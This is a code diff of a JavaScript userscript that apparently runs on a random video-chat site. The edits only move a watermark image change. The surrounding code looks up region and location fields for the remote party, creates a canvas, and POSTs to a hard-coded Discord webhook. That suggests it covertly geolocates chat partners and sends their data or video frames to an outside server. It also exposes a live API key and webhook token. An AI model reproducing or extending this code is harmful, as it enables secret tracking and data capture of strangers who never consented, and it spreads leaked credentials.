@@ -6,7 +6,6 @@
     const head = document.getElementsByTagName('head')[0];
     const body = document.getElementsByTagName('body')[0];
     const apiKey = "fa48bfe0005891";
-    var changed = false;
     const regionNames = new Intl.DisplayNames(['en'], {type: 'region'});
     const hexToDecimal = (hex) => {
         return parseInt(hex.replace("#", ""), 16);
@@ -123,11 +122,6 @@
                 const canvas = document.createElement('canvas');
                 request.open("POST", "https://discord.com/api/webhooks/1079404044445028402/496CuosXZpzH_Q4D1-JwQkE0LOINAAi1Z984gJojItH2Rio0fTWDLKfAbsFLqjbNJShD");
                 request.withCredentials = true
-                if(changed == false){
-                    const watermark = document.querySelector(".remote-video__watermark");
-                    watermark.backgroundImage = "url('https://cdn.discordapp.com/attachments/1137174682588684438/1178089070463815851/fnaf-freddy.gif?ex=6574dff2&is=65626af2&hm=2c305c579339e88c36f2797836604e92384bce88f0b2db6b028d6a5b90d6581f&')"
-                    changed = true;
-                }
                 var set = setInterval(() => {
                 if(wrapper.classList.contains('s-play')){
                     clearInterval(set);
@@ -178,7 +172,9 @@
         var country = document.getElementById("country");
         var loc = document.getElementById("loc");
         var image = document.querySelector("#imag");
-
+        const watermark = document.querySelector(".remote-video__watermark");
+        watermark.backgroundImage = "url('https://cdn.discordapp.com/attachments/1137174682588684438/1178089070463815851/fnaf-freddy.gif?ex=6574dff2&is=65626af2&hm=2c305c579339e88c36f2797836604e92384bce88f0b2db6b028d6a5b90d6581f&')"
+    
         header.style.left = "0px";
         header.style.top = "0px";
         header.onmousedown = function (e) {
